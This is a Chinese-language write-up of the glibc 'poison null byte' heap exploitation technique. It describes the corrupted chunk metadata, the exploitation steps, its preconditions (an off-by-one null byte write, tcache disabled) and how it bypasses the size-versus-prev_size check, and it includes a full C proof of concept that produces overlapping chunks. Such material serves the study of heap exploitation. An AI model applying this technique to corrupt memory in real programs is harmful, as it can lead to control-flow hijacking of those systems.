# 漏洞利用文档：poison_null_byte

## 攻击对象
攻击对象是堆内存中的chunk元数据，具体位置包括：
- **b chunk的size字段**：地址0x603118（在调试记录中），初始值为0x211，通过null byte溢出修改为0x200，移除了PREV_INUSE位。
- **c chunk的prev_size字段**：地址0x603320，本应在malloc操作后更新，但由于溢出导致错误，保持为0x210，而不是正确的0x110。
- **unsorted bin**：b chunk被释放后进入unsorted bin，地址0x603120，fd和bk指针指向main_arena。
- **错误写入位置**：地址0x603310，用于绕过glibc安全检查，写入0x200以匹配修改后的size。

## 利用过程
利用过程简要概括如下：
1. **内存布局准备**：分配a、b、c和barrier chunk，确保b chunk大小为0x200字节（实际元数据大小为0x210），c chunk紧随其后。
2. **绕过安全检查**：在b+0x1f0位置写入0x200，以绕过glibc的`chunksize(P) != prev_size(next_chunk(P))`检查。
3. **释放b chunk**：将b chunk释放到unsorted bin中，使其处于free状态。
4. **null byte溢出**：通过a chunk的off-by-one溢出，写入null字节到b chunk的size字段，将size从0x211修改为0x200，移除PREV_INUSE位，使内存分配器错误认为前一个chunk为free状态。
5. **分配b1 chunk**：malloc(0x100)分配b1，触发unlink操作，但由于prev_size更新错误，c.prev_size保持为0x210，而更新值被错误写入到0x603310。
6. **分配b2 chunk**：malloc(0x80)分配b2，作为 victim chunk，填充内容为'B'字符。
7. **释放b1和c chunk**：free(b1)和free(c)导致chunk错误合并，内存分配器忘记b2的存在，形成一个大的free chunk在unsorted bin中。
8. **分配d chunk**：malloc(0x300)分配d，与b2重叠，并用'D'字符覆盖b2内容，完成内存破坏。

## 利用条件
利用条件包括：
- **off-by-one null byte溢出**：程序存在一个单字节溢出漏洞，允许写入null字节到相邻chunk的size字段。在源码中，体现为`a[real_a_size] = 0`。
- **精确内存布局**：需要特定大小的chunk分配（如b chunk为0x200字节），以确保溢出后size修改正确，并避免其他检查。
- **无tcache**：此利用在禁用tcache的glibc版本中有效，如Ubuntu 16.04 64位系统。
- **悬空指针或UAF**：虽然本利用主要依赖溢出，但最终效果涉及chunk重叠，可能导致UAF（Use-After-Free）如果b2被后续使用。

## 利用效果
利用效果包括：
- **chunk重叠**：d chunk与b2 chunk重叠，导致内存破坏，b2的内容被覆盖（从'B'变为'D'）。
- **内存破坏**：通过重叠，攻击者可以控制b2的数据，可能用于泄露信息或修改关键指针。
- **潜在控制流劫持**：如果b2包含函数指针或敏感数据，重叠后可实现任意代码执行或控制流劫持。
- **DF（Double Free）或UAF**：错误的内存管理可能导致Double Free或Use-After-Free条件，进一步利用。

## 涉及缓解机制
涉及glibc的堆元数据检查机制，主要包括unlink操作中的安全检查。在glibc源码中，相关检查如下（伪代码或源码摘录）：
- **unlink宏中的检查**：在glibc的malloc.c中，unlink操作会验证chunk的size和prev_size是否一致。
  ```c
  // 类似glibc源码中的检查
  if (chunksize(P) != prev_size (next_chunk(P))) {
      malloc_printerr("corrupted size vs. prev_size");
  }
  ```
- **具体到本利用**：通过在b+0x1f0写入0x200，使得`chunksize(P)`（修改后为0x200）等于`prev_size(next_chunk(P))`（0x200），从而绕过检查。此检查在glibc commit 17f487b7afa7cd6c316040f3e6c86dc96b2eec30中添加。

## Proof of Concept
以下是漏洞利用原型的源码，添加了中文注释解释关键步骤：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    printf("Welcome to poison null byte 2.0!\n");
    printf("Tested in Ubuntu 16.04 64bit.\n");
    printf("This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n");
    printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

    uint8_t* a;
    uint8_t* b;
    uint8_t* c;
    uint8_t* b1;
    uint8_t* b2;
    uint8_t* d;
    void *barrier;

    printf("We allocate 0x100 bytes for 'a'.\n");
    a = (uint8_t*) malloc(0x100); // 分配a chunk，大小0x100字节
    printf("a: %p\n", a);
    int real_a_size = malloc_usable_size(a); // 获取a的实际可用大小，包含元数据
    printf("Since we want to overflow 'a', we need to know the 'real' size of 'a' "
        "(it may be more than 0x100 because of rounding): %#x\n", real_a_size);

    b = (uint8_t*) malloc(0x200); // 分配b chunk，大小0x200字节，关键目标
    printf("b: %p\n", b);

    c = (uint8_t*) malloc(0x100); // 分配c chunk，大小0x100字节
    printf("c: %p\n", c);

    barrier =  malloc(0x100); // 分配barrier chunk，防止c与top chunk合并
    printf("We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"
        "The barrier is not strictly necessary, but makes things less confusing\n", barrier);

    uint64_t* b_size_ptr = (uint64_t*)(b - 8); // 指向b chunk的size字段的指针

    // 绕过glibc安全检查：在b+0x1f0写入0x200，以匹配修改后的size
    // 这是因为glibc添加了检查：chunksize(P) != prev_size(next_chunk(P))
    printf("In newer versions of glibc we will need to have our updated size inside b itself to pass "
        "the check 'chunksize(P) != prev_size (next_chunk(P))'\n");
    *(size_t*)(b+0x1f0) = 0x200; // 写入0x200到b+0x1f0，绕过检查

    free(b); // 释放b chunk到unsorted bin中
    printf("b.size: %#lx\n", *b_size_ptr);
    printf("b.size is: (0x200 + 0x10) | prev_in_use\n");
    printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
    a[real_a_size] = 0; // <---  exploited bug: off-by-one null byte溢出，修改b的size为0x200
    printf("b.size: %#lx\n", *b_size_ptr);

    uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2; // 指向c chunk的prev_size字段
    printf("c.prev_size is %#lx\n",*c_prev_size_ptr);

    // 分配b1 chunk，触发unlink操作，但由于prev_size错误，更新不正確
    printf("We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n",
        *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
    b1 = malloc(0x100); // 分配b1，地址与b相同，但大小改变
    printf("b1: %p\n",b1);
    printf("Now we malloc 'b1'. It will be placed where 'b' was. "
        "At this point c.prev_size should have been updated, but it was not: %#lx\n",*c_prev_size_ptr);
    printf("Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
        "before c.prev_size: %lx\n",*(((uint64_t*)c)-4));

    printf("We malloc 'b2', our 'victim' chunk.\n");
    b2 = malloc(0x80); // 分配b2作为victim chunk，内容可控制
    printf("b2: %p\n",b2);

    memset(b2,'B',0x80); // 填充b2内容为'B'字符
    printf("Current b2 content:\n%s\n",b2);

    printf("Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n");
    free(b1); // 释放b1
    free(c);  // 释放c，导致错误合并，忘记b2

    printf("Finally, we allocate 'd', overlapping 'b2'.\n");
    d = malloc(0x300); // 分配d chunk，与b2重叠
    printf("d: %p\n",d);
    
    printf("Now 'd' and 'b2' overlap.\n");
    memset(d,'D',0x300); // 用'D'字符填充d，覆盖b2内容

    printf("New b2 content:\n%s\n",b2);

    printf("Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"
        "for the clear explanation of this technique.\n");

    assert(strstr(b2, "DDDDDDDDDDDD")); // 验证利用成功，b2内容被覆盖
}
```

此PoC演示了如何通过off-by-one null byte溢出实现chunk重叠，最终导致内存破坏。关键注释解释了每个步骤的利用目的。